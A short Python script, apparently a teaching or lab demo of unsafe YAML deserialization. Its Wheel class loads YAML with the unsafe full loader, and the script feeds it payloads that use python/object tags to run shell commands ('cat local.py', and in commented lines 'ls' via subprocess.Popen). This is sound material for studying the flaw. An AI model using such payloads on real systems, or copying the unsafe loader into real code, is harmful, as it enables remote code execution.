import yaml


class Whale:
    def __init__(self, name, image_num, weight):
        self.name = name
        self.image_num = image_num
        self.weight = weight

    def dump(self):
        return yaml.dump(self.__dict__)


class Wheel:
    def __init__(self, name, image_num, diameter):
        self.name = name
        self.image_num = image_num
        self.diameter = diameter

    @staticmethod
    def from_configuration(config):
        return Wheel(**yaml.load(config, Loader=yaml.Loader))

    def dump(self):
        return yaml.dump(self.__dict__)


def main():

    # payload = """
# name: moby
# image_num: 5
# diameter: 23
# """

    # payload = """!!python/object/new:tuple [!!python/object/new:map [!!python/object/new:type [!!python/object/new:subprocess.Popen {}], ['ls']]]"""

    payload = """name: !!python/object/apply:subprocess.check_output [
    !!python/object/new:list { listitems: ['cat', 'local.py'] }
]
image_num: 2
diameter: 23
"""

    # s = """!!python/object/new:list { listitems: ['cat', 'local.py'] }"""
    # print(yaml.load(s))

    # payload = """!!python/object/new:map [!!python/object/new:type [!!python/object/new:subprocess.Popen {}], ['ls']]"""

    # x = yaml.load(payload)
    # print(x)

    wheel = Wheel.from_configuration(payload)
    print('name:      ', wheel.name)
    print('image_num: ', wheel.image_num)
    print('diameter:  ', wheel.diameter)


main()
